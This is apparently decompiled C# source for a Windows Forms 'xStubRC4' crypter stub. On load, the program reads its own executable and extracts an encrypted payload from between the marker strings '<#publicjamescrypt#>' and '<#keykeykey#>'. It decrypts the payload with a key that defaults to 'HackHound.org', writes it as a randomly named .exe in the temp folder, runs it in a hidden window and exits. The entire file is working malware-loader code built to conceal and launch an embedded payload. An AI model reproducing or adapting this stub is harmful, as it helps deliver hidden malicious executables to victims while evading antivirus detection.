using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using xStubRC4.My;

namespace xStubRC4;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private const string FileSplit = "<#publicjamescrypt#>";

	private const string KeySplit = "<#keykeykey#>";

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(162, 107);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 490:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001c;
						case 4:
							goto IL_002c;
						case 5:
							goto IL_0041;
						case 6:
							goto IL_0058;
						case 7:
							goto IL_006b;
						case 8:
							goto IL_0074;
						case 9:
							goto IL_0087;
						case 10:
							goto IL_009b;
						case 11:
							goto IL_00d4;
						case 12:
							goto IL_00e4;
						case 14:
							goto IL_0101;
						case 15:
							goto IL_0105;
						case 13:
						case 16:
						case 17:
							goto IL_0119;
						case 18:
							goto IL_0134;
						case 19:
							goto IL_014c;
						case 20:
							goto IL_015a;
						case 21:
						case 22:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 23:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_015a:
					num = 20;
					Thread.Sleep(600);
					ProjectData.EndApp();
					break;
					IL_014c:
					num = 19;
					Interaction.Shell(text, (AppWinStyle)2, false, -1);
					goto IL_015a;
					IL_0009:
					num = 2;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_001c;
					IL_001c:
					num = 3;
					text2 = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_002c;
					IL_002c:
					num = 4;
					FileSystem.FileGet(1, ref text2, -1L, false);
					goto IL_0041;
					IL_0041:
					num = 5;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_0058;
					IL_0058:
					num = 6;
					text3 = Strings.Split(text2, "<#keykeykey#>", -1, (CompareMethod)0)[1];
					goto IL_006b;
					IL_006b:
					num = 7;
					text3 = "HackHound.org";
					goto IL_0074;
					IL_0074:
					num = 8;
					text4 = Strings.Split(text2, "<#publicjamescrypt#>", -1, (CompareMethod)0)[1];
					goto IL_0087;
					IL_0087:
					num = 9;
					text4 = Strings.Split(text4, "<#keykeykey#>", -1, (CompareMethod)0)[0];
					goto IL_009b;
					IL_009b:
					num = 10;
					text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\" + Conversions.ToString(Number(1, 1000000)) + ".exe";
					goto IL_00d4;
					IL_00d4:
					num = 11;
					FileSystem.FileOpen(1, text, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
					goto IL_00e4;
					IL_00e4:
					num = 12;
					if (!(text3.Contains("oun") & text3.Contains("ack")))
					{
						goto IL_0101;
					}
					goto IL_0119;
					IL_0101:
					num = 14;
					goto IL_0105;
					IL_0105:
					num = 15;
					text3 = Strings.Split(text2, "<#keykeykey#>", -1, (CompareMethod)0)[1];
					goto IL_0119;
					IL_0119:
					num = 17;
					FileSystem.FilePut(1, Encryption.Decrypt(text4, text3), -1L, false);
					goto IL_0134;
					IL_0134:
					num = 18;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_014c;
					end_IL_0000_2:
					break;
				}
				num = 22;
				((Form)this).Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 490;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private int Number(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}
}
